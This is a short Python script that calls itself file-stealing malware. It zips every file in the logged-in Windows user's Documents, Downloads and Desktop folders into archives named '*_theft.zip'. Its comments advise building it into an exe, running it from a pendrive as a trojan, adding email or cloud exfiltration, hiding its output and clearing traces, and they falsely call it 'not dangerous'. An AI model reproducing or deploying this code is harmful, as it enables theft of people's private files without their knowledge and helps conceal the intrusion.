import zipfile, os, shutil as sh

# The avarice witch just wants accumulate wealth
# Steal files with this malware compressing then in zip files

# If you want use this as trojan, implement a way to send the files for you
# Like email send or cloud push, remember to clear your trace

# I recommend you to convert this to exe and put in a pendrive
# After executing the binary all zips will be in the same folder as script

# The default code take all files in documents, downloads and desktop folder
# But you can access the path that you want with this function but stay alert
# You can receive some permission Errors accessing specific folders
# To do this, call the func and pass a name to your zip and a path
# Put the zip name in blacklist to he be ignored by script

# This script leaves no trace, and not dangerous


def theft_all(fn, path):  # fn = file_name
    blacklist = ['downloads_theft.zip', 'documents_theft.zip', 'desktop_theft.zip']
    os.chdir(os.path.abspath(os.path.dirname(__file__)))
    zip = zipfile.ZipFile(fn, 'w')
    os.chdir(path)
    for folder, sub_folders, files in os.walk('.'):
        for file in files:
            if file not in blacklist and file not in zip.namelist():
                print(f'Copying: {file}')  # remove this line to hide details
                zip.write(os.path.join(folder, file),
                          os.path.relpath(os.path.join(folder, file), '.'),
                          compress_type=zipfile.ZIP_DEFLATED)
    zip.close()


# os.getlogin() return the name of logged user
theft_all('documents_theft.zip', f'C:\\Users\\{os.getlogin()}\\Documents')
theft_all('downloads_theft.zip', f'C:\\Users\\{os.getlogin()}\\Downloads')
theft_all('desktop_theft.zip', f'C:\\Users\\{os.getlogin()}\\Desktop')

